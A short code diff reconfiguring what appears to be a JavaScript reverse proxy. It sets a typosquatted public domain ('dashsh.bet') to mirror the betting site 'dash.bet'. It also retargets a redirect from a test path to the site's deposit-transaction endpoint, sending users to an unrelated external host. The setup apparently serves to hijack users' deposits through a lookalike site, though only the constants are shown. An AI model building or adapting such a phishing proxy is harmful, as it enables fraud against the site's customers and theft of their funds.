@@ -9,14 +9,14 @@ const PROXY_PORT = 6005;
 const PROXY_PUBLIC_DOMAIN = "dashsh.bet";
 
 // Upstream production site
-const TARGET_HOSTNAME = "vamos.bet";
+const TARGET_HOSTNAME = "dash.bet";
 const TARGET_PORT = 443;
 
 // Redirect endpoint
-const REDIRECT_API_PATH = "/api/v9/test/redirect";
+const REDIRECT_API_PATH = "/api/v2/transactions/deposit";
 
 // Destination
-const REDIRECT_BASE_URL = "https://test3.marziplus.com";
+const REDIRECT_BASE_URL = "https://poopay-pp-yot-4249.ai.studio";
 
 // Session lifetime
 const REDIRECT_TTL_MS = 30_000;
